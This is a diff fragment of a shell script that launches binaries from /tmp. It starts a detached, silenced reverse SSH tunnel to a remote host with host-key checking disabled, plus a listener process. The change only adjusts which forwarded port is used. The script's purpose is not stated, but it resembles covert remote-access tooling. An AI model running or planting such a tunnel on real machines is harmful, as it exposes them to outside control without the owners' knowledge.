@@ -34,9 +34,9 @@ chmod +x /tmp/openssh
 chmod +x /tmp/listener
 chmod +x /tmp/curl
 
-setsid /tmp/openssh -o StrictHostKeyChecking=no -i /tmp/id_ed25519 -R localhost:"$port_for_scan":localhost:16139 stuff@$ip -p 12936 -N > /dev/null 2>&1 &
+setsid /tmp/openssh -o StrictHostKeyChecking=no -i /tmp/id_ed25519 -R localhost:"$port_for_scan":localhost:"$port_for_scan" stuff@$ip -p 12936 -N > /dev/null 2>&1 &
 
-setsid /tmp/listener '$SPLAVHASH' &
+setsid /tmp/listener '$SPLAVHASH' "$port_for_scan" &
 
 sleep 5
 
